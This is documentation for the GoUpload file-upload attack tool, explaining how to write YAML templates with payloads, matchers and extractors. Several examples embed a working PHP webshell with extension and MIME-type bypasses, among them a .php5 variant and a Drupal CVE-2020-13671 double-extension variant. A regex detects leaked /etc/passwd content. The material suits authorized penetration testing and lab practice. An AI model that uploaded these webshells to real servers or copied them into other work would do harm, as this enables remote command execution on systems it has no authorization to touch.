# Adding New Templates to GoUpload

## Overview

Templates are YAML-based attack profiles that define custom payloads, detection rules, and extraction patterns. They allow GoUpload to be extended without modifying source code.

## Template Structure

```yaml
name: "Template Name"
description: "What this template tests"
author: "@yourhandle"
version: "1.0"
tech_stack: "php"  # php, asp.net, java, nodejs, python, all

# Target configuration
target:
  endpoint: "/upload"
  method: "POST"
  param: "file"

# Custom headers
headers:
  Authorization: "Bearer TOKEN"
  X-Custom-Header: "value"

# Additional form fields
form_data:
  action: "upload"
  user_id: "123"

# Attack payloads
payloads:
  - name: "PHP webshell"
    filename: "shell.php"
    extension: ".php"
    content_type: "image/jpeg"
    body: |
      <?php system($_GET['cmd']); ?>
    tags: ["php", "webshell"]

# Detection matchers (Nuclei-style)
matchers-condition: or
matchers:
  - type: word
    words:
      - "File uploaded"
      - "success"
    condition: or

  - type: regex
    regex:
      - 'root:.*?:[0-9]*:[0-9]*:'
    condition: or

  - type: status
    status:
      - 200
      - 201

# Extract data from responses
extractors:
  - type: regex
    regex:
      - 'uploads/([a-zA-Z0-9/_.-]+)'
    name: file_path
    group: 1

# Simple detection (without matchers)
success_indicators:
  - "File uploaded"
  - "success"

failure_indicators:
  - "File type not allowed"
  - "blocked"
```

## Template Categories

Place templates in the appropriate directory:

```
templates/
├── cms/          # WordPress, Drupal, Joomla
├── cves/         # CVE-specific exploits
├── exploits/     # Server/software exploits
├── frameworks/   # Laravel, Django, Express
├── graphql/      # GraphQL-specific
├── labs/         # DVWA, Juice Shop, Battle Lab
├── enhanced/     # Nuclei-style with regex matchers
└── custom/       # User-created templates
```

## Detection Methods

### Simple Detection (Old Format)

```yaml
success_indicators:
  - "File uploaded"
  - '"success":true'

failure_indicators:
  - "blocked"
  - "not allowed"
```

### Advanced Detection (Nuclei-Style)

```yaml
matchers-condition: and  # ALL matchers must match
matchers:
  # Word match (case-insensitive)
  - type: word
    words:
      - "uploaded"
      - "success"
    condition: or
  
  # Regex match
  - type: regex
    regex:
      - '"id":\s*\d+'
      - 'path["\']?\s*[:=]\s*["\']?([^"'\s]+)'
    condition: or
  
  # HTTP status match
  - type: status
    status: [200, 201]
  
  # Negative matcher (must NOT match)
  - type: word
    words:
      - "error"
      - "blocked"
    negative: true
```

## Matcher Types

| Type | Description | Example |
|------|-------------|---------|
| `word` | Case-insensitive substring match | `"success"` |
| `regex` | Regular expression match | `'uid=\d+'` |
| `status` | HTTP status code match | `[200, 201]` |
| `size` | Response body size | `'>1000'`, `'<5000'` |

## Extractors

Extract data from successful uploads:

```yaml
extractors:
  # Extract uploaded file path
  - type: regex
    regex:
      - 'path["\']?\s*[:=]\s*["\']?([^"'\s]+)'
    name: uploaded_path
    group: 1
  
  # Extract URL from JSON
  - type: regex
    regex:
      - '"url":\s*"([^"]+)"'
    name: file_url
    group: 1
```

## Real-World Examples

### 1. DVWA Medium Security Bypass

```yaml
name: "DVWA Medium Extension Bypass"
tech_stack: "php"
target:
  endpoint: "/DVWA/vulnerabilities/upload/"
  param: "uploaded"
form_data:
  MAX_FILE_SIZE: "100000"
  Upload: "Upload"
payloads:
  - name: "PHP5 bypass"
    filename: "shell.php5"
    extension: ".php5"
    content_type: "image/jpeg"
    body: "<?php system($_GET['cmd']); ?>"
    tags: ["dvwa", "medium", "php5"]
```

### 2. GraphQL Upload Test

```yaml
name: "GraphQL File Upload Test"
tech_stack: "nodejs"
target:
  endpoint: "/graphql"
  param: "file"
graphql:
  mutation: "uploadFile"
  variable: "file"
  operations_template: |
    {"query":"mutation($file:Upload!){uploadFile(file:$file){id}}","variables":{"file":null}}
  map_template: |
    {"0":["variables.file"]}
```

### 3. CVE-Specific Template

```yaml
name: "CVE-2020-13671 - Drupal Double Extension"
tech_stack: "php"
cve: "CVE-2020-13671"
severity: "critical"
target:
  endpoint: "/file/upload"
  param: "files[upload]"
payloads:
  - name: "Double extension .php.txt"
    filename: "shell.php.txt"
    extension: ".txt"
    body: "<?php system($_GET['cmd']); ?>"
    tags: ["drupal", "cve-2020-13671", "double-ext"]
```

## Testing Templates

```bash
# Test against target
./GoUpload --template templates/custom/my-template.yaml \
  -u http://target.com/upload \
  -p file \
  --allow-list .txt,.jpg

# Test against Battle Lab
./GoUpload --template templates/custom/my-template.yaml \
  -u http://localhost:8080/api/upload/unrestricted \
  -p file \
  --allow-list .txt,.jpg \
  --no-validate

# Test against DVWA
./GoUpload --template templates/custom/my-template.yaml \
  -u http://localhost/DVWA/vulnerabilities/upload/ \
  -H "Cookie: PHPSESSID=xxx; security=low" \
  -p uploaded \
  -d "MAX_FILE_SIZE=100000&Upload=Upload" \
  --allow-list .jpg,.png \
  --no-validate
```

## Template Validation

```bash
# Check YAML syntax
yamllint templates/custom/my-template.yaml

# Test template loads correctly
./GoUpload --template templates/custom/my-template.yaml --help

# Run with verbose output
./GoUpload --template templates/custom/my-template.yaml \
  -u http://target.com/upload -p file --allow-list .txt 2>&1 | head -50
```

## Best Practices

1. **Always include `success_indicators` or `matchers`** - Without detection rules, templates can't identify vulnerabilities
2. **Use specific indicators** - Avoid generic words like "ok" that cause false positives
3. **Tag payloads** - Use descriptive tags for filtering and reporting
4. **Test against Battle Lab first** - Verify detection before using on real targets
5. **Include `failure_indicators`** - Helps reduce false positives
6. **Use `content_type` for bypass testing** - Essential for MIME-type validation bypasses
7. **Keep payloads realistic** - Use actual webshell code, not placeholder text

## Sharing Templates

Templates can be shared with the community:

1. Fork the [GoUpload Templates](https://github.com/HaakimSec/GoUpload) repository
2. Add your template to the appropriate directory
3. Submit a Pull Request with:
   - Template description
   - Target information
   - Test results

## Template Repository Structure

```
templates/
├── cms/wordpress.yaml        # WordPress media upload
├── cves/CVE-2020-13671.yaml  # Drupal double extension
├── exploits/apache.yaml      # Apache .htaccess tricks
├── frameworks/laravel.yaml   # Laravel file upload
├── graphql/apollo.yaml       # Apollo Server upload
├── labs/battle-lab.yaml      # Battle Lab test suite
├── enhanced/file-upload-lfi.yaml  # LFI via file upload
└── custom/                   # Your templates here
```
